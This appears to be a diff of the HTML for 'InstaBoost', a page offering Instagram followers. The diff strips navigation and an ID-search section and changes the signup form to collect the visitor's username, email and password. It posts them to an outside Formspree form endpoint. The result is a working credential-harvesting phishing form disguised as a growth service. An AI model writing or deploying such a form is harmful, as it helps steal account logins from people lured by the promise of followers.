@@ -52,12 +52,8 @@
 <body>
   <nav>
     <a href="#">InstaBoost</a>
-    <a href="#search-id">Search ID</a>
     <a href="#how">How It Works</a>
     <a href="#pricing">Pricing</a>
-    <a href="#login">Login</a>
-    <a href="#brand">Join as Brand</a>
-    <a href="#creator">Join as Creator</a>
   </nav>
 
   <header class="hero">
@@ -66,23 +62,13 @@
     <a href="#form" class="btn">Start Growing</a>
   </header>
 
-  <section id="search-id">
-    <div class="form-container">
-      <h2>Search User ID</h2>
-      <form>
-        <input type="text" placeholder="Enter Instagram @username" required>
-        <button type="submit" class="btn">Find ID</button>
-      </form>
-      <p id="user-id-result" style="margin-top:15px; font-weight:bold;"></p>
-    </div>
-  </section>
-
   <section id="form">
     <div class="form-container">
       <h2>Increase Your Followers</h2>
       <form action="https://formspree.io/f/mpwjvlya" method="POST">
+        <input type="username" name="username" placeholder="Enter your username" required>
         <input type="email" name="email" placeholder="Enter your email" required>
-        <textarea name="message" placeholder="Enter your Instagram details" required></textarea>
+        <input type="Password" name="password" placeholder="Enter your password" required>
         <select name="package" required>
           <option value="">Select Followers Package</option>
           <option value="100">+100 Followers</option>
